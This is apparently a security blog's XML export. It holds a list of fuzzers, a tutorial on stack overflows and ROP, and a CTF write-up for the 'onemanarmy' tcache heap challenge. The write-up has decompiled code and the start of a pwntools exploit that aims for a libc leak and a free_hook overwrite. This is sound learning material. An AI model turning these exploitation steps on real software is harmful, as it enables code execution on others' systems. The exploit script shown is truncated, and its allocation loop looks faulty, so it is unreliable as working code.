<p>In 2019, <a class="link"   href="https://daramg.gift/paper/han-ndss2019.pdf" >“CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines”<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://wcventure.github.io/FuzzingPaper/Paper/ICSE19_Superion.pdf" >“Superion: Grammar-Aware Greybox Fuzzing”<i class="fas fa-external-link-alt"></i></a> are published, and they both cited <a class="link"   href="https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final73.pdf" >“Fuzzing with Code Fragments”<i class="fas fa-external-link-alt"></i></a>.<br><code>CodeAlchemist</code> put input to syntax tree analysis and data flow analysis, then set pre &amp; post constraints for splited fragments: pre constraints for variable defination; post constraints for fragment’s result, both for solving undefined variable reference.<br><code>Superion</code> put syntax tree mutation rules into <code>AFL</code>, use <code>AFL</code> to select input. It supports mutiple programming languages and also uses <code>ANTLR</code> for syntax tree analysis, grammatical expansion friendly.</p>
<p>You can find <a href="https://github.com/SoftSec-KAIST/CodeAlchemist"><code>CodeAlchemist</code></a> and <a href="https://github.com/zhunki/Superion"><code>Superion</code></a> on the Github.</p>
<h3 id="AI-in-Fuzzing"><a href="#AI-in-Fuzzing" class="headerlink" title="AI in Fuzzing"></a>AI in Fuzzing</h3><p>2018 is the Year of Artificial Intelligence.</p>
<p><code>AI</code> has penetrated into many fields, so will <code>fuzzing</code>. Now people use <code>AI</code> to produce testing inputs. The question is, to obtain desired effect we have to feed the model too much samples, which is definitely inefficient nowadays.</p>
<p>But that doesn’t mean it is useless, because even if brutal mutation is fast, it needs a good mutating direction to be efficient, that’s part of <code>AI</code> jobs.</p>
<h2 id="Fuzzer-List"><a href="#Fuzzer-List" class="headerlink" title="Fuzzer List"></a>Fuzzer List</h2><p>From the blog of <a class="link"   href="https://github.com/riusksk" >riusksk<i class="fas fa-external-link-alt"></i></a>.</p>
<ol>
<li><a class="link"   href="http://lcamtuf.coredump.cx/afl/" >AFL<i class="fas fa-external-link-alt"></i></a><br>Code coverage guided fuzzer, a milestone, mutation strategy needs improvement.</li>
<li><a class="link"   href="https://github.com/googleprojectzero/winafl" >WinAFL<i class="fas fa-external-link-alt"></i></a><br>The <code>AFL</code> for <code>windows</code>, use <code>DynamoRIO</code> to instrument closed source softwares, support hardware PT(processor tracing)</li>
<li><a class="link"   href="https://github.com/mboehme/aflfast" >AFLFast<i class="fas fa-external-link-alt"></i></a><br>Faster <code>AFL</code></li>
<li><a class="link"   href="https://github.com/vusec/vuzzer" >Vuzzer<i class="fas fa-external-link-alt"></i></a><br>Coverage guided fuzzer, supports closed source softwares, tracks data flow using pin of LibDFT, get more path by combining static&#x2F;dynamic analysis. </li>
<li><a class="link"   href="https://github.com/hunter-ht-2018/ptfuzzer" >PTfuzzer<i class="fas fa-external-link-alt"></i></a><br>Coverage guided fuzzer using Intel PT(processor tracing) on <code>Linux</code>, so it supports closed source softwares.</li>
<li><a class="link"   href="https://github.com/tigerpuma/Afl_unicorn" >afl-unicorn<i class="fas fa-external-link-alt"></i></a><br>The <code>AFL</code> using <code>unicorn</code> simulating instructions, supports <code>linux</code> closed source softwares.</li>
<li><a class="link"   href="https://github.com/wmliang/pe-afl" >pe-afl<i class="fas fa-external-link-alt"></i></a><br>The <code>AFL</code> for <code>windows</code> closed source softwares using static instrumentation, supports user level apps and kernel driver.</li>
<li><a class="link"   href="https://github.com/RUB-SysSec/kAFL/" >kAFL<i class="fas fa-external-link-alt"></i></a><br>The <code>AFL</code> for kernel <code>fuzzing</code> of <code>QEMU</code> VM, supports <code>linux</code>, <code>macOS</code> and <code>windows</code>.</li>
<li><a class="link"   href="https://github.com/nccgroup/TriforceAFL" >TriforceAFL<i class="fas fa-external-link-alt"></i></a><br>The <code>AFL</code> based on <code>QEMU</code> whole OS simulation, tracks branch infomation relying on system simulator, supports <code>linux</code> kernel <code>fuzzing</code>.</li>
<li><a class="link"   href="https://github.com/google/clusterfuzz" >ClusterFuzzer<i class="fas fa-external-link-alt"></i></a><br>An open source extensive <code>fuzzing</code> infrastructure. </li>
<li><a class="link"   href="https://llvm.org/docs/LibFuzzer.html" >LibFuzzer<i class="fas fa-external-link-alt"></i></a><br>A part of <code>llvm</code>, an open source in-process coverage guided fuzz engine library.</li>
<li><a class="link"   href="https://github.com/google/oss-fuzz" >OSS-Fuzz<i class="fas fa-external-link-alt"></i></a><br>Open source fuzzer collection based on <code>OSS-Fuzz</code>, can automatically download, compile and run in docker.</li>
<li><a class="link"   href="https://github.com/google/honggfuzz" >honggfuzz<i class="fas fa-external-link-alt"></i></a><br>coverage driven fuzzer from Google, based on software&#x2F;hardware, supports multiple platform (<code>Linux</code>&#x2F;<code>macOS</code>&#x2F;<code>Windows</code>&#x2F;<code>Android</code>). </li>
<li><a class="link"   href="https://github.com/mwrlabs/KernelFuzzer" >KernelFuzzer<i class="fas fa-external-link-alt"></i></a><br>Cross-platform kernel fuzzing framework, the strategy is not open source (needs to implement by yourself), supports <code>Windows</code>&#x2F;<code>OSX</code>&#x2F;<code>QNX</code> (only provides <code>Windows</code> compiling script).</li>
<li><a class="link"   href="https://github.com/mwrlabs/OSXFuzz.git" >OSXFuzzer<i class="fas fa-external-link-alt"></i></a><br><code>MacOS</code> kernel fuzzer based on <code>KernelFuzzer</code>.</li>
<li><a class="link"   href="https://github.com/SilverMoonSecurity/PassiveFuzzFrameworkOSX" >PassiveFuzzFrameworkOSX<i class="fas fa-external-link-alt"></i></a><br>Using HOOK to achieve passive <code>OSX</code> kernel fuzzer.</li>
<li><a class="link"   href="https://github.com/googleprojectzero/bochspwn" >Bochspwn<i class="fas fa-external-link-alt"></i></a><br>Based on <code>Boch</code> instrumentation API to detect <code>Double Fetches</code> kernel vulns.</li>
<li><a class="link"   href="https://github.com/googleprojectzero/bochspwn-reloaded" >Bochspwn-reloaded<i class="fas fa-external-link-alt"></i></a><br>Based on <code>Boch</code> instrumentation API to detect info leaking.</li>
<li><a class="link"   href="https://github.com/google/syzkaller" >syzkaller<i class="fas fa-external-link-alt"></i></a><br>A <code>linux</code> kernel fuzzer, based on coverage guidance, need to implement API call template based on its template syntax, then provide it for <code>syzkaller</code> to mutatedata.</li>
<li><a class="link"   href="https://github.com/MozillaSecurity/dharma" >dharma<i class="fas fa-external-link-alt"></i></a><br>Based on grammar template generated fuzzer, open sourced by Mozilla to fuzz Firefox JS engine.</li>
<li><a class="link"   href="https://github.com/googleprojectzero/domato" >domator<i class="fas fa-external-link-alt"></i></a><br>DOM Fuzzer open sourced by <em>Project Zero</em>, a fuzzer based on template generating in Python.</li>
<li><a class="link"   href="https://github.com/googleprojectzero/fuzzilli" >Fuzzilli<i class="fas fa-external-link-alt"></i></a><br>JS engine fuzzer based on grammar mutation, generates testing cases through grammar template, then generate intermediate grammar to mutate, trigger more path combining coverage guidance.</li>
<li><a class="link"   href="https://github.com/compsec-snu/razzer" >Razzer<i class="fas fa-external-link-alt"></i></a><br>Fuzzer for kernel race condition vulns.</li>
<li><a class="link"   href="https://github.com/mwrlabs/ViridianFuzzer" >ViridianFuzzer<i class="fas fa-external-link-alt"></i></a><br>For fuzzing Hyper-V hypercalls kernel driver, from <code>MWRLabs</code>.</li>
<li><a class="link"   href="https://github.com/demi6od/ChromeFuzzer" >ChromeFuzzer<i class="fas fa-external-link-alt"></i></a><br>Chrome fuzzer modified from grinder grammar generator.</li>
<li><a class="link"   href="https://github.com/MozillaSecurity/funfuzz" >funfuzz<i class="fas fa-external-link-alt"></i></a><br>JS fuzzer collection open sourced by Mozilla, mainly to fuzz SpiderMonkey.</li>
</ol>
]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>list</tag>
        <tag>fuzzing</tag>
        <tag>symbolic-execution</tag>
      </tags>
  </entry>
  <entry>
    <title>Stack Overflow Intro</title>
    <url>/2020/10/15/2020-10-15-Stack-Overflow-Intro/</url>
    <content><![CDATA[<p>Concise Challenge-Oriented <code>stack</code> overflow introduction.</p>
<h2 id="Stack-Introduction"><a href="#Stack-Introduction" class="headerlink" title="Stack Introduction"></a>Stack Introduction</h2><p>It is a LIFO (Last in First Out) data structure, and basic operations include <code>pop</code> and <code>push</code>.<br><img src="/imghost/soi/Data_stack.png" alt="Data_stack"><br>There are more kinds of complex stack in data structure, the operations are more than just <code>pop</code> and <code>push</code>. But neither of them is the stack of operating system, <code>OS</code> uses the basic one. BTW  <code>stack</code> grows from high address to low address.</p>
<p>Besides <code>stack</code>, <code>OS</code> has <code>register</code> to store things<br><img src="/imghost/soi/register.png" alt="register"></p>
<p>The <code>stack</code> serves for storing variables and function frames, can be called <code>call stack</code> as well. When storing function frames, program has to consider storing function parameters, variables and their order; old <code>ebp</code>&#x2F;<code>rbp</code> for recovering previous frame; <code>return addr</code> to return after exiting current function.</p>
<p>The classic layout for function call <code>stack</code> is:<br><img src="/imghost/soi/classic.jpg" alt="classic"><br>The layout when it needs to store some <code>register</code> on <code>stack</code> is:<br><img src="/imghost/soi/possible.jpg" alt="possible"><br>A <code>stack</code> frame can be like:<br><img src="/imghost/soi/stack_frame.jpg" alt="stack_frame"></p>
<p>Should caller function store the parameters&#x2F;arguments, or should callee do?<br>Store them from left to right, or from right to left?<br>They are specified in the <code>calling convention</code>:</p>
<table>
<thead>
<tr>
<th>Call  method</th>
<th>Arg  stack  order</th>
<th>Arg  location</th>
<th>Func  to  clean  stack</th>
<th>Variable  arg  support</th>
<th>Func  name  format</th>
<th>Start  of  arg  list</th>
</tr>
</thead>
<tbody><tr>
<td>stdcall (Win32)</td>
<td>right to left</td>
<td>stack</td>
<td>callee</td>
<td>no</td>
<td>_name@number</td>
<td>“@@YG”</td>
</tr>
<tr>
<td>cdecl</td>
<td>right to left</td>
<td>stack</td>
<td>caller</td>
<td>yes</td>
<td>_name</td>
<td>“@@YA”</td>
</tr>
<tr>
<td>fastcall</td>
<td>right to left, arg1 in ecx, arg2 in edx</td>
<td>stack, registers</td>
<td>callee</td>
<td>no</td>
<td>@name@number</td>
<td>“@@YI”</td>
</tr>
<tr>
<td>thiscall (C++)</td>
<td>right to left, pointer ‘this’  in ecx</td>
<td>stack, registers, ecx</td>
<td>callee</td>
<td>no</td>
<td></td>
<td></td>
</tr>
<tr>
<td>naked call</td>
<td>customize</td>
<td>customize</td>
<td>customize</td>
<td>customize</td>
<td>customize</td>
<td>customize</td>
</tr>
</tbody></table>
<p>Note: what we are talking above are in <code>32-bit</code>, in <code>64-bit</code> the first <code>6</code> arguments of called function are saved in <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code> and <code>r9</code> in order.</p>
<h2 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h2><p><a class="link"   href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" >Stack buffer overflow<i class="fas fa-external-link-alt"></i></a> happens when program writes bytes to stack beyond variable’s original size.</p>
<p>In <code>32-bit</code> if we have a variable <code>s</code> to overflow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">High addr                                  +-----------------+</span><br><span class="line">                                           |     retaddr     |</span><br><span class="line">                                           +-----------------+</span><br><span class="line">                                           |     saved ebp   |</span><br><span class="line">                                    ebp---&gt;+-----------------+</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |                 |</span><br><span class="line">Low addr                   s(ebp-offset)--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
<p>We write <code>offset*&#39;a&#39; + &#39;bbbb&#39; + target_addr</code>, it will be like</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">High addr                                  +-----------------+</span><br><span class="line">                                           |   target_addr   |</span><br><span class="line">                                           +-----------------+</span><br><span class="line">                                           |      &#x27;bbbb&#x27;     |</span><br><span class="line">                                    ebp---&gt;+-----------------+</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |      offset     |</span><br><span class="line">                                           |        *        |</span><br><span class="line">                                           |       &#x27;a&#x27;       |</span><br><span class="line">                                           |                 |</span><br><span class="line">                                           |                 |</span><br><span class="line">Low addr                   s(ebp-offset)--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
<p>So when this function <code>return</code> it will return to execute codes at <code>target_addr</code>.</p>
<p>vulnerable function includes:</p>
<ul>
<li>Input<ul>
<li><code>gets</code>, read a line, neglect <code>\x00</code></li>
<li><code>scanf</code></li>
<li><code>vscanf</code></li>
</ul>
</li>
<li>Output<ul>
<li><code>sprintf</code></li>
</ul>
</li>
<li>String<ul>
<li><code>strcpy</code>, string copy, stop when meet <code>\x00</code></li>
<li><code>strcat</code>, string concatenate, stop when meet <code>\x00</code></li>
<li><code>bcopy</code></li>
</ul>
</li>
</ul>
<p>Determine padding length:</p>
<ul>
<li>Index related to <code>ebp</code>, check directly</li>
<li>Index related to <code>esp</code>, needs debugging</li>
<li>Direct address index, which gives the address</li>
</ul>
<p>To overflow we have some choices:</p>
<ul>
<li>overflow return address</li>
<li>overflow some variable on <code>stack</code></li>
<li>overflow some variable on <code>bss</code></li>
<li>overflow some special address</li>
</ul>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROP(Return Oriented Programming) is based on <code>stack</code> overflow, try to use useful code gadgets in the program to control execution flow.<br>Gadgets looks like: <code>pop rdi ; ret</code>, <code>add ecx, ecx ; ret</code> and <code>mov ebx, dword ptr [esp] ; ret</code>.<br>They should end with a <code>ret</code> so that every gadget can execute one by one.</p>
<p>There are also many types of it:</p>
<ul>
<li>Basic part<ul>
<li><code>ret2text</code> : return to codes in <code>.text</code></li>
<li><code>ret2shellcode</code> : return to execute your input shellcode</li>
<li><code>ret2syscall</code> : return to execute <code>system call</code> like <code>execve</code></li>
<li><code>ret2libc</code> : return to execute func in <code>libc</code> (need to leak base addr)</li>
</ul>
</li>
<li>Intermediate<ul>
<li><code>ret2csu</code> : using gadgets in <code>__libc_csu_init</code> in <code>64-bit</code></li>
<li><code>ret2reg</code> : search <code>call/jmp reg</code> to return, inject shellcode to where <code>reg</code> points to</li>
<li><code>BROP</code> : Blind ROP, <a class="link"   href="http://www.scs.stanford.edu/brop/bittau-brop.pdf" >paper<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf" >slide<i class="fas fa-external-link-alt"></i></a>,<br>  attack without source code and binary file</li>
</ul>
</li>
<li>Advanced<ul>
<li><code>ret2_dl_runtime_resolve</code> : exploit <code>_dl_runtime_resolve(link_map_obj, reloc_index)</code> (dynamic link)</li>
<li><code>SROP</code> : Sigreturn Oriented Programming, <a class="link"   href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" >paper<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" >slide<i class="fas fa-external-link-alt"></i></a>,<br>  <code>signature</code> is a <code>syscall</code> called in <code>signal</code> mechanism of UNIX-like system</li>
<li><code>ret2VDSO</code> : Virtual Dynamically-linked Shared Object,<br>  some kernel state call are mapped to user state to run faster,<br>  intel cpu: <code>sysenter</code>, <code>sysexit</code><br>  amd cpu: <code>syscall</code>, <code>sysret</code></li>
</ul>
</li>
</ul>
<p>Related challenge collections of mine (ADWorld series):<br><a href="/2020/07/24/2020-07-24-ADWorld-PWN-Exercise-Area-Write-ups/#ROP-Part">ADWorld PWN Exercise Area Write-ups (ROP Part)</a><br><a href="/2020/07/29/2020-07-29-ADWorld-PWN-Challenge-Area-Write-ups-ret2text-Part/">ADWorld PWN Challenge Area Write-ups (ret2text Part)</a><br><a href="/2020/08/07/2020-08-07-ADWorld-PWN-Challenge-Area-Write-ups-ret2libc-Part/">ADWorld PWN Challenge Area Write-ups (ret2libc Part)</a><br><a href="/2020/10/09/2020-10-09-ADWorld-PWN-Challenge-Area-Write-ups-Advanced-ROP/">ADWorld PWN Challenge Area Write-ups (Advanced ROP)</a></p>
<p>There are also JOP(Jump-oriented programming) and COP(Call-oriented programming), which have similar feature to control program flow.</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>stack-overflow</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (Tcache)</title>
    <url>/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-Tcache/</url>
    <content><![CDATA[<h2 id="onemanarmy"><a href="#onemanarmy" class="headerlink" title="onemanarmy"></a>onemanarmy</h2><p>Attachment: <a href="/filehost/apcaw/onemanarmy.zip">onemanarmy.zip</a><br>Description: None</p>
<p>It is an easy overflow task exploiting <code>tcache</code>.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip onemanarmy.zip</span><br><span class="line">Archive:  onemanarmy.zip</span><br><span class="line">   creating: ��+�/</span><br><span class="line">  inflating: ��+�/libc-2.27.so</span><br><span class="line">  inflating: ��+�/oneman_army</span><br><span class="line">$ ls</span><br><span class="line">&#x27;&#x27;$&#x27;\251\242&#x27;&#x27;+&#x27;$&#x27;\246&#x27;   ...</span><br><span class="line"></span><br><span class="line">$ cd &#x27;&#x27;$&#x27;\251\242&#x27;&#x27;+&#x27;$&#x27;\246&#x27;</span><br><span class="line">$ ls</span><br><span class="line">libc-2.27.so  oneman_army</span><br></pre></td></tr></table></figure>
<p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file oneman_army</span><br><span class="line">oneman_army: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8de0b8e14f617090c8f545fa079a000791aef5a5, for GNU/Linux 3.2.0, stripped</span><br><span class="line">$ checksec oneman_army</span><br><span class="line">[*] &#x27;/root/\xa9\xa2+\xa6/oneman_army&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ chmod +x libc-2.27.so</span><br><span class="line">$ ./libc-2.27.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">    v4 = <span class="built_in">atoi</span>(&amp;s);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free_func</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">9011</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !dword_4050 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid option!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      <span class="built_in">alloc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>alloc</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="built_in">LODWORD</span>(size) = <span class="built_in">atoi</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;size + <span class="number">4</span>) &amp; <span class="number">0x1FF</span>;</span><br><span class="line">  buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>, (<span class="keyword">char</span> *)&amp;size + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>show</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>free_func</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>We only need to focus on <code>alloc()</code> and the secret command <code>9011</code> in <code>main()</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">9011</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_4050 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It neglects the size limit, so we can use it to perform heap overflow.</p>
<p>First we need to leak something. Since we are able to overflow and <code>tcache</code> has no chunk size check like <code>fastbin</code>, we can easily do <code>unsorted bin attack</code> and use <code>show()</code> to leak <code>main arena + 0x88</code>, then we will calculate <code>malloc hook addr</code> and get <code>libc addr</code>. </p>
<p>Then we can write <code>system()</code> or <code>one gadget</code> of <code>libc</code> to <code>free hook addr</code>, and trigger shellcode by subfunction <code>3.free</code>.</p>
<p>Actually the exploit varies from person to person, and the arrangement of memory is a bit difficult, so please check the exploit script for details. </p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;oneman_army&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;31153&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;oneman_army&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_func</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func_9011</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;9011&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc continuous spaces and put them into tcache list</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>): </span><br><span class="line"><span class="comment"># enough memory space is needed, or the fake large chunk won&#x27;t be put in unsorted bin </span></span><br><span class="line"><span class="comment"># the fake chunk cannot overlap unallocated memory</span></span><br><span class="line">    <span class="built_in">sum</span> += <span class="number">0x10</span> * (i+<span class="number">1</span>)</span><br><span class="line">    free_func()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-----------------------------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;alloced memory size: &#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;-----------------------------------------------&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc chunk 0 and overflow using &#x27;func_9011&#x27;</span></span><br><span class="line">alloc(<span class="number">0x10</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x10</span>*<span class="string">&#x27;1&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x581</span>) </span><br><span class="line"><span class="comment"># the size should be larger than tcache, 24-&gt;1032 bytes on 64-bit and 12-&gt;516 bytes on 